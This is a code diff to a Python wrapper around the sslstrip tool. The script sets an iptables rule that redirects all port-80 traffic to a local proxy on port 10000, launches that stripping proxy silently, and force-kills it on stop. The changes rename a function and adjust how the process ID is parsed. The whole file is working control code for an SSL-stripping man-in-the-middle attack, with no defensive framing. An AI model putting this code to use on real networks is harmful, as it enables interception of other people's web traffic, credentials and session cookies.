@@ -7,6 +7,7 @@ from sslstrip.sslstrip.CookieCleaner import CookieCleaner
 import sys
 import subprocess as sp
 from os import devnull
+from time import sleep
 
 DEVNULL = open(devnull, 'w')
 
@@ -17,7 +18,7 @@ strippingFactory          = http.HTTPFactory(timeout=10)
 strippingFactory.protocol = StrippingProxy
 
 
-def sslStripping():
+def startStripping():
 
     print("\nSSL stripping listening on port 10000\n")
 
@@ -26,8 +27,6 @@ def sslStripping():
     
     sp.Popen("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000".split())
     sp.Popen("python sslStart.py".split(), stdout=DEVNULL, stderr=DEVNULL)
-
-    return
 
 
 def sslStatus():
@@ -48,21 +47,13 @@ def displayStatus():
     else:
         print("\ninactive")
 
-    return
-
 
 def stopStripping():
 
     status = sslStatus()
 
-    while status: 
+    while len(status): 
         
-        pid = status[0].split()[-1][0:4]
+        pid = status[0].split()[-1].split("/")[0]
         sp.Popen(["kill", "-9", str(pid)])
-        print("\nprocess killed")
         status = sslStatus()
-
-    else:
-        print("\nssl stripping not active")
-
-    return
